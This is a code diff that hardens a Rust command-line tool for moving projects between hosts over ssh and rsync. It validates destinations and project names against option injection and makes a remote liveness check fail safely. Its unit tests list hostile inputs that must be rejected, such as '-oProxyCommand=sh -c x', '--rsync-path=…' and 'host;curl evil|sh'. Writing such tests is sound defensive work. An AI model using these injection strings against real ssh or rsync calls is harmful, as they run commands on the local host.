@@ -108,6 +108,7 @@ pub(crate) fn cmd_preflight(args: &[String]) {
         eprintln!("usage: tup preflight <project>");
         exit(2);
     }
+    crate::project::ensure_valid_name(&args[0]);
     preflight_report(&args[0]);
 }
 
@@ -243,6 +244,15 @@ pub(crate) fn cmd_move(args: &[String]) {
     }
     let project = &args[0];
     let dest = &args[1];
+    // Validate BOTH the project name and the destination up front — before preflight or the
+    // quiesce below touches anything — so a bad value can't kill the source and then abort, and
+    // can never reach a path or a shell/ssh argument. (local_move/remote_move re-check, so they
+    // stay self-guarding.)
+    crate::project::ensure_valid_name(project);
+    match dest.strip_prefix("local:") {
+        Some(newproj) => crate::project::ensure_valid_name(newproj),
+        None => validate_dest(dest),
+    }
 
     preflight_report(project);
 
@@ -265,10 +275,9 @@ pub(crate) fn cmd_move(args: &[String]) {
 }
 
 fn local_move(project: &str, newproj: &str) {
-    if newproj.is_empty() || newproj.contains('/') {
-        eprintln!("tup: invalid target project '{newproj}'");
-        exit(2);
-    }
+    // Same guard as every other verb: `local:..` must not resolve project_dir to ~ and then be
+    // rsync --delete'd, and a leading-dash name must not reach the spawned `tup up` as a flag.
+    crate::project::ensure_valid_name(newproj);
     if newproj == project {
         eprintln!("tup: source and destination are the same project");
         exit(2);
@@ -325,21 +334,42 @@ fn local_move(project: &str, newproj: &str) {
     }
 }
 
-fn remote_running(dest: &str, project: &str) -> bool {
-    Command::new("ssh")
+/// Remote liveness of the project's init. `Some(true)`/`Some(false)` only when pgrep ran and
+/// gave a definite answer; `None` when we CAN'T tell (ssh/connection error, pgrep missing).
+/// The caller must treat `None` as "do not proceed" — a false "not running" would let a later
+/// `rsync --delete` wipe a live remote working tree.
+fn remote_running(dest: &str, project: &str) -> Option<bool> {
+    // `project` is validated by the caller, so it is safe inside the single-quoted pattern.
+    match Command::new("ssh")
         .arg(dest)
         .arg(format!("pgrep -f '/run/tup init {project}' >/dev/null 2>&1"))
         .status()
-        .map(|s| s.success())
-        .unwrap_or(false)
+    {
+        Ok(s) => match s.code() {
+            Some(0) => Some(true),  // pgrep matched → running
+            Some(1) => Some(false), // pgrep ran, matched nothing → not running
+            _ => None,              // 255 (ssh error), 127 (no pgrep), signalled, …
+        },
+        Err(_) => None, // couldn't even spawn ssh
+    }
 }
 
 fn remote_move(project: &str, dest: &str) {
+    validate_dest(dest);
     // Ship to ~/.tup/<project> on the remote (rsync remote paths are relative to $HOME),
     // then start it there detached. Assumes `tup` is on PATH on the remote.
-    if remote_running(dest, project) {
-        eprintln!("tup: '{project}' is already running on {dest} — stop it there first");
-        exit(1);
+    match remote_running(dest, project) {
+        Some(true) => {
+            eprintln!("tup: '{project}' is already running on {dest} — stop it there first");
+            exit(1);
+        }
+        None => {
+            eprintln!(
+                "tup: couldn't determine whether '{project}' is running on {dest} (ssh/pgrep failed); aborting rather than risk `rsync --delete` over a live working tree"
+            );
+            exit(1);
+        }
+        Some(false) => {}
     }
     let src_dir = project_dir(project);
     let s = format!("{}/", src_dir.join("root").display());
@@ -392,10 +422,63 @@ fn remote_move(project: &str, dest: &str) {
     eprintln!("[tup] requested start on {dest}; confirm with: ssh {dest} tup preflight {project}");
 }
 
+/// Validate an ssh destination before it reaches ssh/rsync as a positional argument. The
+/// critical rule is "no leading '-'": ssh and rsync parse a leading-dash argument as an
+/// OPTION, so a dest like `-oProxyCommand=sh -c '…'` would execute a command on the LOCAL
+/// host before any connection. We also keep the charset tight ([user@]host); for a port, an
+/// IPv6 literal, or an ssh:// URL, use an ssh config alias (which fits this charset).
+fn dest_is_valid(dest: &str) -> bool {
+    !dest.is_empty()
+        && !dest.starts_with('-')
+        && dest
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@'))
+}
+
+fn validate_dest(dest: &str) {
+    if !dest_is_valid(dest) {
+        eprintln!(
+            "tup: invalid destination '{dest}' — expected [user@]host (letters, digits, '.', '_', '-', '@'; no leading '-'). For a port/IPv6/ssh:// target, use an ssh config alias."
+        );
+        exit(2);
+    }
+}
+
 fn ssh(dest: &str, cmd: &str) {
     match Command::new("ssh").arg(dest).arg(cmd).status() {
         Ok(s) if s.success() => {}
         Ok(s) => eprintln!("[tup] ssh {dest} failed ({s}): {cmd}"),
         Err(e) => eprintln!("[tup] ssh error: {e}"),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::dest_is_valid;
+
+    #[test]
+    fn accepts_plain_ssh_targets() {
+        for d in ["host", "user@host", "my-alias", "box.lan", "u_1@10.0.0.2"] {
+            assert!(dest_is_valid(d), "{d} should be accepted");
+        }
+    }
+
+    #[test]
+    fn rejects_option_injection_and_metachars() {
+        // The critical case: a leading '-' makes ssh/rsync treat the dest as an OPTION, so
+        // -oProxyCommand=… would run locally. Plus anything with shell/space/quote characters.
+        for d in [
+            "",
+            "-oProxyCommand=sh -c x",
+            "--rsync-path=touch /tmp/x",
+            "host;curl evil|sh",
+            "host path",
+            "host$(id)",
+            "`id`",
+            "host:2222",
+            "ssh://host",
+        ] {
+            assert!(!dest_is_valid(d), "{d:?} should be rejected");
+        }
     }
 }
